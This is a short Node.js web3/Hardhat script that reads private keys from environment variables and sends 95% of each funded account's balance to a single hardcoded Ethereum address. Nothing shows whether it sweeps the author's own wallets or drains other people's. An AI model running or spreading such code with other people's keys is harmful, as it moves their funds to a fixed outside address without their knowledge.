require('dotenv').config();

const Web3 = require('web3');
const web3 = new Web3(Web3.givenProvider || process.env.NETWORK_KEY);
const hre = require("hardhat");
var Accounts = require('web3-eth-accounts');
var accounts = new Accounts(process.env.NETWORK_KEY);

const key = process.env.KEY.split(",");

async function main() {
  let stopped = false;
  

  for (let index = 0; index < key.length; index++) {
    const account = web3.eth.accounts.privateKeyToAccount(key[index]);
    const accountBalance = await web3.eth.getBalance(account.address);

    const gasLimit = 42000;

    const gasPrice = await web3.eth.getGasPrice();
    const amount = await web3.eth.getBalance(account.address);

    if(amount > 0) {
      const tx = await web3.eth.accounts.signTransaction({
        to: '0xD844C6Dc4E328024a1EA1baDd31FCe7b4790934B',
        value: (amount*0.95).toString(),
        gas: '2000000',
      }, key[index])
      .then(signed => {
        web3.eth.sendSignedTransaction(signed.rawTransaction).on('receipt', console.log)
      });
    }
  }
}


main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
